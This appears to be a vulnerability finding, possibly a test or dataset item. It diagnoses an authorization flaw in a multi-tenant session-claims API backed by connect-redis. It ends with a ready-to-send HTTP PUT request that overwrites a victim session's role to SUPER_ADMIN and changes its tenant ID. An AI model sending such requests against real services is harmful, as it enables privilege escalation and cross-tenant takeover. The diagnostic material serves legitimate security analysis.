diagnosis: The endpoint updates session claims directly inside the connect-redis session store using req.params.sessionId and req.body. Because it does not verify whether the targeted session belongs to the caller's tenant or validate whether the caller has tenant administration rights, an attacker can overwrite the role of any arbitrary user session to 'ADMIN', achieving direct privilege escalation.
exploit_request:
PUT /api/tenants/sessions/sess_victim_user_10294/claims HTTP/1.1
Host: auth.saas.internal:5000
Content-Type: application/json
Cookie: connect.sid=s%3Aattacker_session_cookie

{"updatedRole": "SUPER_ADMIN", "customClaims": {"tenantId": "tenant_target_corp"}}
